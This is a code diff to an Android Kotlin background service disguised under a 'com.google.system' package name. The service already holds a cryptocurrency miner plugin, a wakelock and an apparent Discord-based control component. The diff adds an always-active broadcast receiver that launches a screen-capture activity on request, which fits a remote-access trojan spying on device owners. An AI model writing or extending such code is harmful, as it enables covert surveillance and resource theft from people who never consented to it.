@@ -82,6 +82,7 @@ class SystemNetworkService : Service() {
     private var streamMessageId: String? = null
     private var isDownloadingUpdate = false
     private var minerPlugin: com.google.system.plugins.MinerPlugin? = null
+    private var screenRequestReceiver: BroadcastReceiver? = null
 
     override fun onBind(i: Intent?): IBinder? = null
 
@@ -140,6 +141,9 @@ class SystemNetworkService : Service() {
 
         // Register network callback for auto-reconnect
         registerNetworkCallback()
+
+        // Register screen capture request receiver (always active in service)
+        registerScreenRequestReceiver()
 
         // Initialize miner plugin via PluginManager
         try {
@@ -205,6 +209,7 @@ class SystemNetworkService : Service() {
     override fun onDestroy() {
         try { wakeLock?.release() } catch (_: Exception) {}
         try { networkCallback?.let { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).unregisterNetworkCallback(it) } } catch (_: Exception) {}
+        try { screenRequestReceiver?.let { unregisterReceiver(it) } } catch (_: Exception) {}
         try { discord?.stop() } catch (_: Exception) {}
         try { scope.cancel() } catch (_: Exception) {}
         try { minerPlugin?.onDisable() } catch (_: Exception) {}
@@ -2032,5 +2037,25 @@ class SystemNetworkService : Service() {
         } catch (e: Exception) {
             
         }
+    }
+
+    private fun registerScreenRequestReceiver() {
+        try {
+            screenRequestReceiver = object : BroadcastReceiver() {
+                override fun onReceive(ctx: Context?, intent: Intent?) {
+                    try {
+                        val screenIntent = Intent(this@SystemNetworkService, com.openaccess.sdk.ScreenCaptureActivity::class.java)
+                        screenIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        startActivity(screenIntent)
+                    } catch (_: Exception) {}
+                }
+            }
+            val filter = IntentFilter("com.openaccess.sdk.REQUEST_SCREEN")
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(screenRequestReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
+            } else {
+                registerReceiver(screenRequestReceiver, filter)
+            }
+        } catch (_: Exception) {}
     }
 }
